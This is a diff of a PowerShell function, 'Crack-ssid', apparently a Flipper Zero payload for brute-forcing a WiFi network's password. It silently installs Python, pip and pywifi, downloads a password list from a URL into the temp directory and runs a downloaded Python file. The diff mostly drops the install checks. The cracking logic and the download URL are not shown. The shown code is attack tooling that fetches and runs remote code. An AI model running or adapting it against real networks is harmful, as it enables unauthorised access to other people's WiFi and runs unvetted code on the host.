@@ -3,39 +3,28 @@ function Crack-ssid {
         [string]$ssid
     )
 
-    # Check if Python is installed
-    $pythonInstalled = Get-Command python -ErrorAction SilentlyContinue
-    if (-not $pythonInstalled) {
-        # Download and install Python
-        $pythonInstallerUrl = 'https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe'
-        $pythonInstallerPath = "$env:TEMP\python-installer.exe"
-        Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile $pythonInstallerPath -UseBasicParsing
-        Start-Process -FilePath $pythonInstallerPath -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait
-        Remove-Item -Path $pythonInstallerPath -Force
-    }
+    # Download and install Python
+    $pythonInstallerUrl = 'https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe'
+    $pythonInstallerPath = "$env:TEMP\python-installer.exe"
+    Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile $pythonInstallerPath -UseBasicParsing
+    Start-Process -FilePath $pythonInstallerPath -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait
+    Remove-Item -Path $pythonInstallerPath -Force
 
-    # Check if pip is installed
-    $pipInstalled = Get-Command pip -ErrorAction SilentlyContinue
-    if (-not $pipInstalled) {
-        # Download and install pip
-        $getPipUrl = 'https://bootstrap.pypa.io/get-pip.py'
-        $getPipPath = "$env:TEMP\get-pip.py"
-        Invoke-WebRequest -Uri $getPipUrl -OutFile $getPipPath -UseBasicParsing
-        python $getPipPath
-        Remove-Item -Path $getPipPath -Force
-    }
+    # Download and install pip
+    $getPipUrl = 'https://bootstrap.pypa.io/get-pip.py'
+    $getPipPath = "$env:TEMP\get-pip.py"
+    Invoke-WebRequest -Uri $getPipUrl -OutFile $getPipPath -UseBasicParsing
+    python $getPipPath
+    Remove-Item -Path $getPipPath -Force
 
     # Check if comtypes is installed
     $comtypesInstalled = Get-Command python -ErrorAction SilentlyContinue | ForEach-Object { $_.ModuleName } | Where-Object { $_ -eq 'comtypes' }
     if (-not $comtypesInstalled) {
         # Install comtypes
-        pip3 install comtypes
+        pip install comtypes
     }
 
     # Install pywifi
-    pip3 install pywifi
-
-	# Just in case lolol
     pip install pywifi
 
     # Download pass.txt from the URL and save it to the user's temp directory
@@ -55,6 +44,4 @@ function Crack-ssid {
     python $flipperFilePath
 }
 
-
 # Crack-ssid -ssid "YOUR_SSID_HERE"
-
